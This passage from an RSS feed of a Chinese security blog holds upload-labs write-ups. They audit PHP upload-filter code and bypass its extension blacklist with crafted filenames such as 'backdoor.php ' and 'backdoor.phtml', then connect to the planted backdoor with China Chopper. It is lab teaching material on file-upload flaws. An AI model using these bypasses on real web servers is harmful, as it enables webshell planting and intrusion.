class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;title function_ invoke__&#34;&gt;date&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).&lt;span class=&#34;title function_ invoke__&#34;&gt;rand&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt;).&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;此文件不允许上传&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现，跟前面源码的差距是加入了转换为小写，却&lt;strong&gt;忘记添加上对后缀名去空格&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;同样，抓包修改，文件名为&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;filename=&lt;span class=&#34;string&#34;&gt;&amp;quot;backdoor.php &amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003171112732.png&#34; alt=&#34;image-20221003171112732&#34;&gt;&lt;/p&gt;
&lt;p&gt;连接菜刀即可。&lt;/p&gt;
&lt;p&gt;在windows主机上一定要对后缀名进行&lt;code&gt;去空格&lt;/code&gt;操作。&lt;/p&gt;
&lt;p&gt;至此，演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/phtml%E8%A7%A3%E6%9E%90%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/</guid>
            <title>phtml解析审计+绕过</title>
            <link>https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/phtml%E8%A7%A3%E6%9E%90%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/</link>
            <category>文件上传漏洞探究</category>
            <pubDate>Mon, 03 Oct 2022 15:05:25 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;phtml解析审计-绕过&#34;&gt;&lt;a href=&#34;#phtml解析审计-绕过&#34; class=&#34;headerlink&#34; title=&#34;phtml解析审计+绕过&#34;&gt;&lt;/a&gt;phtml解析审计+绕过&lt;/h1&gt;&lt;p&gt;总结一下对于以下四种文件类型，可能的绕过方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.asp&lt;/code&gt;: &lt;code&gt;.asa&lt;/code&gt;/ &lt;code&gt;.cer&lt;/code&gt;/ &lt;code&gt;.cdx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.aspx&lt;/code&gt;: &lt;code&gt;.ashx&lt;/code&gt;/ &lt;code&gt;.asmx&lt;/code&gt;/ &lt;code&gt;.ascx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.php&lt;/code&gt;: &lt;code&gt;.php4&lt;/code&gt;/ &lt;code&gt;.php5&lt;/code&gt;/ &lt;code&gt;.pthml&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.jsp&lt;/code&gt;: &lt;code&gt;.jspx&lt;/code&gt;/ &lt;code&gt;.jspf&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;pthml解析审计&#34;&gt;&lt;a href=&#34;#pthml解析审计&#34; class=&#34;headerlink&#34; title=&#34;pthml解析审计&#34;&gt;&lt;/a&gt;pthml解析审计&lt;/h2&gt;&lt;p&gt;其中，关于pthml可以去看一下&lt;code&gt;C:\phpStudyB\Apache\conf\httpd.conf&lt;/code&gt;文件中对于php文件类型的解析&lt;/p&gt;
&lt;p&gt;这里&lt;code&gt;.pthml&lt;/code&gt;后缀的文件可以被后台解析成&lt;code&gt;.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003151119447.png&#34; alt=&#34;image-20221003151119447&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们以Pass-03为例：&lt;/p&gt;
&lt;p&gt;上传backdoor.php，点击上传后，显示“&lt;strong&gt;不允许上传.asp, .aspx, .php, .jsp后缀文件！&lt;/strong&gt;”&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003151302968.png&#34; alt=&#34;image-20221003151302968&#34;&gt;&lt;/p&gt;
&lt;p&gt;OK，我们看一下源码信息：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;file_exists&lt;/span&gt;(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;.asp&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;.aspx&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;.php&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;.jsp&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;trim&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;deldot&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//删除文件名末尾的点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;strrchr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;strtolower&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//转换为小写&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;str_ireplace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;::$DATA&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//去除字符串::$DATA&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;trim&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//收尾去空&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;title function_ invoke__&#34;&gt;in_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;title function_ invoke__&#34;&gt;date&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).&lt;span class=&#34;title function_ invoke__&#34;&gt;rand&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt;).&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;以上代码核心干了这么几件事：&lt;/p&gt;
&lt;p&gt;当文件上传路径存在时&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置黑名单，过滤&lt;code&gt;.asp&lt;/code&gt;, &lt;code&gt;.aspx&lt;/code&gt;, &lt;code&gt;.php&lt;/code&gt;, &lt;code&gt;.jsp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;trim()&lt;/code&gt;函数&lt;code&gt;过滤&lt;/code&gt;上传文件名的&lt;code&gt;空格&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;deldot()&lt;/code&gt;函数&lt;code&gt;删除&lt;/code&gt;文件名&lt;code&gt;最末尾的点&lt;/code&gt;【这是一种绕过方式，后面的博客会介绍到】&lt;/li&gt;
&lt;li&gt;&lt;code&gt;strrchr()&lt;/code&gt;函数以&lt;code&gt;.点&lt;/code&gt;为截断符，获取其右边的字符串，即获取&lt;code&gt;文件后缀名&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;strtolower()&lt;/code&gt;函数将文件后缀名全部转换成&lt;code&gt;小写&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;str_ireplace()&lt;/code&gt;函数将去除后缀名当中的&lt;code&gt;::$DATA&lt;/code&gt;，是一种Windows本地文件系统中的文件流，也是一种绕过方式&lt;/li&gt;
&lt;li&gt;再次调用&lt;code&gt;trim()&lt;/code&gt;函数对后缀名进行&lt;code&gt;去空格&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;另外，&lt;code&gt;$img_path&lt;/code&gt;这回使用了&lt;code&gt;date函数及其格式化&lt;/code&gt;，再使用了&lt;code&gt;1000-9999的随机数&lt;/code&gt;作为路径名的组成部分。&lt;/p&gt;
&lt;p&gt;date() 函数的第一个必需参数 &lt;em&gt;format&lt;/em&gt; 规定了如何格式化日期/时间。&lt;/p&gt;
&lt;p&gt;可以在字母之间插入其他字符，比如 “/“、”.” 或者 “-“，这样就可以增加附加格式了&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;date&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Y/m/d&amp;quot;&lt;/span&gt;) . &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;date&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Y.m.d&amp;quot;&lt;/span&gt;) . &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;date&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Y-m-d&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;上面代码的输出如下所示：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2016&lt;/span&gt;/&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;/&lt;span class=&#34;number&#34;&gt;21&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2016.10&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;21&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2016&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;21&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里列出了一些可用的字符：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Y - 代表年 （四位，如2022）&lt;/li&gt;
&lt;li&gt;m - 代表月 （01 到 12）&lt;/li&gt;
&lt;li&gt;d - 代表月中的天 （01 到 31）&lt;/li&gt;
&lt;li&gt;&lt;p&gt;H - 小时，24 小时格式，有前导零 （00 到 23）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;i - 有前导零的分钟数 （00 到 59）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;s - 秒数，有前导零 （00 到 59）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;pthml解析绕过&#34;&gt;&lt;a href=&#34;#pthml解析绕过&#34; class=&#34;headerlink&#34; title=&#34;pthml解析绕过&#34;&gt;&lt;/a&gt;pthml解析绕过&lt;/h2&gt;&lt;p&gt;审计完上述代码，发现对于文件后缀并没有过滤完整，放出了诸如php4、php5、pthml的类型&lt;/p&gt;
&lt;p&gt;抓包，送入Repeater&lt;/p&gt;
&lt;h3 id=&#34;尝试一：修改为-php4&#34;&gt;&lt;a href=&#34;#尝试一：修改为-php4&#34; class=&#34;headerlink&#34; title=&#34;尝试一：修改为.php4&#34;&gt;&lt;/a&gt;尝试一：修改为.php4&lt;/h3&gt;&lt;p&gt;修改为&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;filename=&lt;span class=&#34;string&#34;&gt;&amp;quot;backdoor.php4&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003154317074.png&#34; alt=&#34;image-20221003154317074&#34;&gt;&lt;/p&gt;
&lt;p&gt;打开页面看看，但并没有解析成php执行。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003154519115.png&#34; alt=&#34;image-20221003154519115&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;尝试二：修改为-php5&#34;&gt;&lt;a href=&#34;#尝试二：修改为-php5&#34; class=&#34;headerlink&#34; title=&#34;尝试二：修改为.php5&#34;&gt;&lt;/a&gt;尝试二：修改为.php5&lt;/h3&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;filename=&lt;span class=&#34;string&#34;&gt;&amp;quot;backdoor.php5&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003154701928.png&#34; alt=&#34;image-20221003154701928&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们打开网页看看，依旧没有解析成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003154727447.png&#34; alt=&#34;image-20221003154727447&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;尝试三：修改为-phtml&#34;&gt;&lt;a href=&#34;#尝试三：修改为-phtml&#34; class=&#34;headerlink&#34; title=&#34;尝试三：修改为.phtml&#34;&gt;&lt;/a&gt;尝试三：修改为.phtml&lt;/h3&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;filename=&lt;span class=&#34;string&#34;&gt;&amp;quot;backdoor.phtml&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003154847390.png&#34; alt=&#34;image-20221003154847390&#34;&gt;&lt;/p&gt;
&lt;p&gt;打开网页看看，没有原样输出，成功解析。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003154915997.png&#34; alt=&#34;image-20221003154915997&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用菜刀连接：&lt;/p&gt;
&lt;p&gt;①清空缓存库&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003155031987.png&#34; alt=&#34;image-20221003155031987&#34;&gt;&lt;/p&gt;
&lt;p&gt;②添加，输入刚刚上传的后门url，添加参数&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003155130387.png&#34; alt=&#34;image-20221003155130387&#34;&gt;&lt;/p&gt;
&lt;p&gt;双击，成功连接。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003155153049.png&#34; alt=&#34;image-20221003155153049&#34;&gt;&lt;/p&gt;
&lt;p&gt;另外，由于解析源码中只罗列了&lt;code&gt;.php&lt;/code&gt;, &lt;code&gt;.phtml&lt;/code&gt;，我们可以添加&lt;code&gt;.txt&lt;/code&gt;或者 &lt;code&gt;.abcd&lt;/code&gt;都可以。&lt;/p&gt;
&lt;p&gt;只要写入了支持解析的类型，重启Apache服务，黑客就可以上传对应的后门文件，进行菜刀连接。&lt;/p&gt;
&lt;p&gt;至此，演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/Content-type%E9%AA%8C%E8%AF%81%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/</guid>
            <title>Content-type验证审计+绕过</title>
            <link>https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/Content-type%E9%AA%8C%E8%AF%81%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/</link>
            <category>文件上传漏洞探究</category>
            <pubDate>Mon, 03 Oct 2022 14:44:03 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;content-type验证审计-绕过&#34;&gt;&lt;a href=&#34;#content-type验证审计-绕过&#34; class=&#34;headerlink&#34; title=&#34;content-type验证审计+绕过&#34;&gt;&lt;/a&gt;content-type验证审计+绕过&lt;/h1&gt;&lt;p&gt;本篇讲解对于文件上传漏洞中——content type验证审计+绕过&lt;/p&gt;
&lt;h2 id=&#34;content-type验证审计&#34;&gt;&lt;a href=&#34;#content-type验证审计&#34; class=&#34;headerlink&#34; title=&#34;content-type验证审计&#34;&gt;&lt;/a&gt;content-type验证审计&lt;/h2&gt;&lt;p&gt;来到Pass-02&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003135212262.png&#34; alt=&#34;image-20221003135212262&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们点击上传，会提示“文件类型不正确，请重新上传”&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003135246520.png&#34; alt=&#34;image-20221003135246520&#34;&gt;&lt;/p&gt;
&lt;p&gt;不多说，直接开始抓包，看看怎么个情况。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003135340470.png&#34; alt=&#34;image-20221003135340470&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;媒体类型&lt;/strong&gt;（通常称为 &lt;strong&gt;Multipurpose Internet Mail Extensions&lt;/strong&gt; 或 &lt;strong&gt;MIME&lt;/strong&gt; 类型）是一种标准，用来表示文档、文件或字节流的性质和格式。&lt;/p&gt;
&lt;p&gt;通用结构：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;type/subtype&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;MIME 的组成结构非常简单；由类型与子类型两个字符串中间用&lt;code&gt;&amp;#39;/&amp;#39;&lt;/code&gt;分隔而组成。不允许空格存在。&lt;/p&gt;
&lt;ul&gt;
